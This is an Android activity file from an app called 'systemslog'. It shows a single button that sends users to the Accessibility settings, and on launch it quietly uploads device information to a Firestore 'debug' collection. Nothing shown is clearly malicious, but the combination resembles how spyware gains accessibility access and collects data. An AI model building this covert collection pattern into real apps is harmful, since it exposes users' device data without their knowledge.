package com.example.systemslog;

import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import androidx.appcompat.app.AppCompatActivity;

import com.example.systemslog.utils.DeviceInfo;
import com.google.firebase.firestore.FirebaseFirestore;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Button btn = new Button(this);
        btn.setText("Enable Accessibility Service");

        btn.setOnClickListener(v -> {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        });

        setContentView(btn);

        // Firebase test
        FirebaseFirestore.getInstance()
                .collection("debug")
                .document("test")
                .set(new DeviceInfo(this).toMap());
    }
}
